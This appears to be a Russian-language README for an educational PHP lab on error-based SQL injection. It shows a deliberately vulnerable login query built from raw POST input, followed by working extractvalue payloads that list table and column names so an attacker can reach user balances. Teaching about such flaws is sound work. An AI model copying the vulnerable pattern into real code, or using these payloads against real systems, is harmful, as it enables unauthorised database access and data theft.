# SQL injection on PHP

Пример применения sql инъекций на PHP. Эта работа создана в образовательных целях и показывает программистам как не надо писать код. Данный сайт является примером эксплуатации уязвимости типа error-based. В основе примера обычная форма авторизации на сайте, состоящая из двух полей логина и пароля.

<p>
  <a href="LICENSE">
    <img src="https://img.shields.io/badge/license-MIT-brightgreen.svg?style=flat-square" alt="Software License" />
  </a>
</p>

## Требуется

* Запущеный OpenServer или аналоги с PHP и MySQL
* GIT
* Browser или Postman

## Установка и подготовка к запуску

1.  Сохранить репозиторий на своём ПК

```
git clone https://github.com/HenkCord/sql-injection-example-php.git
```

2.  Сформировать базу данных открыв в браузере

```
/init_db.php
```

3.  Открыть основной файл

```
/index.php
```

## Приступим

Как выглядит уязвимый код на PHP

```php
$login = $_POST['login'];
$password = $_POST['password'];
$sql = "SELECT id FROM users WHERE login = '$login' and password = '$password'";
if ($result = mysqli_query($link, $sql)) {
    if (mysqli_num_rows($result)) {
        $authenticated = true;
    } else {
        $error_message = 'Не правильные логин или пароль';
    }
} else {
    $error_message = mysqli_error($link);
}
```

1.  Пробуем авторизоваться, подставив в любое поле кaвычку (‘), в результате чего получаем ошибку.

В результате получаем такой конечный вид запроса к базе данных, который вызывает ошибку:

```sql
SELECT id FROM users WHERE login = ''' and password = '';
```

2.  Получаем название первой таблицы из текущей базы данных:

```sql
' and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1))) -- comment
```

для получения второй и последующих названий таблиц необходимо поменять `limit 0,1` на `limit 1,1` и тд.

3.  Далее, зная название существующих таблиц в базе данных, требуется найти названия атрибутов:

```sql
' and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name='название таблицы' limit 0,1))) -- comment
```

для получения второго и последующих названий атрибутов необходимо поменять `limit 0,1` на `limit 1,1` и тд.

4.  Конечная цель получить текущий баланс баллов пользователя.

## License

The MIT License (MIT). Please see [License File](LICENSE.md) for more information.

[link-author]: https://github.com/HenkCord
